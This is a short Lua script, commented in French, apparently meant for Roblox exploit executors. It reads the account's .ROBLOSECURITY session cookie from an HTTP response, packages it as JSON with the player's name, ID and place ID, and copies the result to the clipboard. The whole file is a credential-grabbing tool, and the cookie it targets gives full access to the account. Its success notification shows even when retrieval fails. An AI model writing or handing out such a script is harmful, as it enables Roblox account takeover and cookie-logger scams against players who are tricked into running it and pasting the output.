-- Script pour récupérer le cookie Roblox et copier les données en JSON
-- Compatible Android / PC selon exécuteur (setclipboard requis)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Fonction pour obtenir le cookie .ROBLOSECURITY
local function getCookie()
    local cookie = ""

    if syn then
        local res = syn.request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then
            cookie = res.Cookies[".ROBLOSECURITY"]
        end
    elseif http and http.request then
        local res = http.request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then
            cookie = res.Cookies[".ROBLOSECURITY"]
        end
    elseif request then
        local res = request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then
            cookie = res.Cookies[".ROBLOSECURITY"]
        end
    end

    return cookie or "Cookie non trouvé"
end

-- Fonction pour copier les données en JSON
local function copyToClipboard(token, userId, userName)
    local data = {
        player_name = userName,
        player_id = userId,
        token = token,
        place_id = game.PlaceId,
        time = os.time(),
        platform = "Android / Clipboard"
    }

    local jsonData = HttpService:JSONEncode(data)

    if setclipboard then
        setclipboard(jsonData)
        print("Données copiées dans le presse‑papier")
    else
        warn("setclipboard non supporté sur cet exécuteur")
        print(jsonData)
    end
end

-- Exécution principale
local cookie = getCookie()
if cookie ~= "Cookie non trouvé" then
    copyToClipboard(cookie, player.UserId, player.Name)
else
    warn("Cookie non récupéré")
end

-- Notification locale
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Succès",
    Text = "Données copiées dans le presse‑papier",
    Duration = 5
})
